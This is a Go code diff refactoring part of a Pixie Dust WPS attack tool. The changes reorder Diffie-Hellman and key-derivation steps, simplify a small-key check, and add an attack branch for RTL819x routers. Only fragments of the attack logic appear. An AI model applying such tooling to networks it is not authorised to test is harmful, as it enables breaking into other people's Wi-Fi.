@@ -91,7 +91,7 @@ func (pda *pixieDustAttack) execute() {
     pda.checkRTL819xPKE()
     pda.executeRTL819xCase() // it stops here if executed
     pda.validDHSmallFlag()
-    pda.checkSmallDHKeys()
+    pda.setSmallKeys()
     pda.validRequiredFlags()
     pda.validDates()
     pda.setModes()
@@ -99,8 +99,7 @@ func (pda *pixieDustAttack) execute() {
     pda.setTimeRange()
     pda.setDHSmall()
     pda.computeAuthKey()
-    pda.setKDK()
-    pda.kdf()
+    pda.memAllocSecrestAndPSKs()
     pda.emptyPinHMAC()
     pda.trySpecialCases()   // it stops here if true
     pda.mainLoop()
@@ -109,20 +108,18 @@ func (pda *pixieDustAttack) execute() {
 
 
 
-func (pda *pixieDustAttack) checkSmallDHKeys() {
-    lenPkr := len(pda.pkr)
-
-    if lenPkr != wpsPkeyLen {
-        pda.dhSmall = false
+func (pda *pixieDustAttack) checkSmallDHKeys() bool {
+    if len(pda.pkr) != wpsPkeyLen {
+        return false
     }
 
-    for i := 0; i < lenPkr - 1; i++ {
+    for i := 0; i < len(pda.pkr)-1; i++ {
         if pda.pkr[i] != 0 {
-            pda.dhSmall = false
+            return false
         }
     }
 
-    pda.dhSmall = pda.pkr[lenPkr - 1] == 0x02
+    return pda.pkr[len(pda.pkr)-1] == 0x02
 }
 
 
@@ -137,7 +134,7 @@ func (pda *pixieDustAttack) setModes() {
 
     pda.modes = append(pda.modes, rt)
 
-    if pda.isGlibc() {
+    if pda.isGlibcNonce() {
         pda.modes = append(pda.modes, rtl819x)
     }
 
@@ -168,6 +165,10 @@ func (pda *pixieDustAttack) computeAuthKey() {
     } else if pda.isRTL819x {
         pda.computeDHKey()
     }
+
+    pda.setKDK()
+    pda.memAllocAuthKey()
+    pda.kdf()
 }
 
 
@@ -287,6 +288,11 @@ func (pda *pixieDustAttack) mainLoop() {
 
         if m == eCosSimple && pda.eNonce != nil {
             pda.attackECOSSimple()
+            continue
+        }
+
+        if m == rtl819x && pda.eNonce != nil {
+            pda.attackRTL819x()
             continue
         }
     }
